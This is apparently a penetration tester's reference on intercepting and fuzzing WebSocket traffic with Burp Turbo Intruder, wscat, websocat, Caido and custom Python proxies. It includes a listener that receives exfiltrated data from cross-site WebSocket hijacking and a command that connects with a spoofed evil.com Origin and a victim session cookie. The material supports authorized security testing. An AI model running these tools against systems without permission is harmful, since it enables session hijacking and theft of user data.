# Tooling & Interception — Deep Reference

## Burp Suite Pro — WebSocket Testing

### Capturing WebSocket Traffic
1. Browser → Burp proxy → target (standard HTTPS intercept)
2. Navigate to the page that initiates the WebSocket connection
3. Burp Proxy → WebSockets history tab — all frames visible here
4. Right-click any frame → Send to Repeater for manual replay/modification

### Burp Repeater — Manual Frame Modification
- Select a captured frame in WS history
- Send to Repeater
- Modify the message body
- Click "Send" — Burp sends the modified frame over the existing connection
- View response frames in the right panel

### WebSocket Turbo Intruder (BApp Store)

Install: Extensions → BApp Store → WebSocket Turbo Intruder

#### Basic Fuzzing Script
Right-click any WS message → Extensions → WebSocket Turbo Intruder → Send to Turbo Intruder

```python
# Basic script — replace %s with payload
def queue_websockets(upgrade_request, message):
    connection = websocket_connection.create(upgrade_request)
    for payload in payloads:
        connection.queue(message.replace('%s', payload))

def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

#### HTTP Middleware — Pipe WS through Burp Scanner
Right-click → Send to WebSocket HTTP Middleware

```python
# ServerExample.py (bundled with extension)
def create_connection(upgrade_request):
    connection = websocket_connection.create(upgrade_request)
    return connection

def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

@MatchRegex(r'expected_response_pattern')
def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

Now any HTTP POST to `localhost:9000/proxy?url=ENCODED_WS_URL` is forwarded as a WS message.
Point Burp Active Scanner at the HTTP middleware endpoint to auto-scan WS payloads.

```bash
# Test manually via curl:
curl -s -X POST "http://127.0.0.1:9000/proxy?url=wss%3A%2F%2Ftarget.com%2Fws" \
  -H "Content-Type: application/json" \
  -d '{"message":"hello"}'
```

#### THREADED Engine for Race Conditions
```python
# Built-in RaceConditionExample.py template
def config():
    return {
        'engine': engine.THREADED,
        'concurrentConnections': 10,
        'requestsPerConnection': 1,
    }

def queue_websockets(upgrade_request, message):
    for i in range(10):
        connection = websocket_connection.create(upgrade_request)
        connection.queue(message)

def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

#### Socket.IO Support in Turbo Intruder
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
    connection = websocket_connection.create(
        upgrade_request.withUpdatedParameters(
            HttpParameter.urlParameter("EIO", "4")
        )
    )
    connection.queue('40')  # Socket.IO CONNECT namespace
    connection.queue(message)

@Pong("3")
def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

#### WS Turbo Intruder CLI (Standalone)
```bash
java -jar WebSocketFuzzer-2.0.0.jar \
  <scriptFile.py> \
  <upgradeRequestFile.txt> \
  <wsEndpoint> \
  <basePayload>
```

#### Message Filtering Decorators
```python
@MatchRegex(r'"user":"Victim"')          # Only show responses matching regex
@MatchStatus(200)                         # HTTP status match (for middleware mode)
@LengthMatch(100, 200)                    # Response length range
```

---

## wscat — CLI Manual Testing

```bash
# Install
npm install -g wscat

# Basic connect
wscat -c wss://target.com/ws

# With custom headers (Origin spoofing, Cookie, Auth)
wscat -c wss://target.com/ws \
  -H "Cookie: session=VICTIM_TOKEN" \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer TOKEN"

# Skip TLS verification (self-signed certs)
wscat -c wss://target.com/ws --no-check

# With sub-protocol
wscat -c wss://target.com/ws --protocol stomp

# Pipe commands
echo '{"action":"get_profile"}' | wscat -c wss://target.com/ws
```

---

## websocat — Unix-Style WS Client

```bash
# Install (Rust binary)
cargo install websocat

# Basic usage
websocat wss://target.com/ws

# With headers
websocat -H "Cookie: session=TOKEN" wss://target.com/ws

# Pipe to/from stdin/stdout
echo '{"cmd":"list_users"}' | websocat wss://target.com/ws

# Serve as relay (intercept/modify)
websocat -t ws-listen:127.0.0.1:8765 wss://target.com/ws

# Binary mode
websocat -b wss://target.com/ws
```

---

## Caido — WebSocket Interception

1. Set browser proxy to Caido (default 127.0.0.1:8080)
2. Navigate to target — WS connections appear in Caido's "Events" tab
3. Right-click any WS message → Replay
4. Caido supports WS replaying natively with header modification

---

## Python Custom Proxy / Listener

### Man-in-the-Middle WebSocket Proxy
```python
import asyncio, websockets

UPSTREAM = "wss://target.com/ws"

async def intercept_and_modify(msg: str) -> str:
    # Modify messages here for testing
    print(f"--> Client sent: {msg}")
    # Example: inject a field
    import json
    try:
        data = json.loads(msg)
        data["injected"] = "test"
        return json.dumps(data)
    except json.JSONDecodeError:
        return msg

async def proxy_handler(client_ws, path):
    upstream_ws = await websockets.connect(UPSTREAM)
    
    async def client_to_upstream():
        async for msg in client_ws:
            modified = await intercept_and_modify(msg)
            await upstream_ws.send(modified)
    
    async def upstream_to_client():
        async for msg in upstream_ws:
            print(f"<-- Server: {msg}")
            await client_ws.send(msg)
    
    done, pending = await asyncio.wait(
        [asyncio.create_task(client_to_upstream()),
         asyncio.create_task(upstream_to_client())],
        return_when=asyncio.FIRST_COMPLETED
    )
    for task in pending:
        task.cancel()

async def main():
    async with websockets.serve(proxy_handler, "127.0.0.1", 8765):
        print("MitM proxy on ws://127.0.0.1:8765")
        await asyncio.Future()

asyncio.run(main())
```

Connect browser to `ws://127.0.0.1:8765` and traffic flows through the proxy.

### Python Listener — Exfil Receiver for CSWSH
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json, datetime

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        data = params.get("data", [""])[0]
        
        timestamp = datetime.datetime.now().isoformat()
        print(f"\n[{timestamp}] CSWSH DATA RECEIVED:")
        try:
            pretty = json.dumps(json.loads(data), indent=2)
            print(pretty)
        except Exception:
            print(data)
        
        # Save to file
        with open("exfil_log.txt", "a") as f:
            f.write(f"{timestamp}: {data}\n")
        
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass  # Suppress default logs

print("CSWSH exfil listener on :8888")
HTTPServer(("0.0.0.0", 8888), ExfilHandler).serve_forever()
```

---

## Automated Discovery — Find WebSocket Endpoints

```bash
# Grep JavaScript bundles for ws:// or wss://
grep -r "wss\?://" /path/to/downloaded/js/ 2>/dev/null

# Search JS for WebSocket constructor
grep -r "new WebSocket" /path/to/js/ 2>/dev/null

# From Burp: export all requests, grep for Upgrade: websocket
grep -i "upgrade: websocket" burp_export.txt

# nikto will not find WS — use custom wordlist with ffuf on upgrade paths
ffuf -u https://target.com/FUZZ \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -w /path/to/api-wordlist.txt \
  -mc 101

# Common WebSocket paths
/ws  /websocket  /socket  /socket.io  /ws/  /api/ws  /chat  /live
/stream  /events  /notify  /push  /realtime  /feed
```

---

## TLS/WSS Testing

```bash
# Check TLS config of WSS endpoint
testssl.sh --starttls=ws wss://target.com/ws

# OpenSSL raw connect
openssl s_client -connect target.com:443

# After TLS handshake, send upgrade manually (for testing TLS vuln + WS)
# Then type the HTTP upgrade headers
```
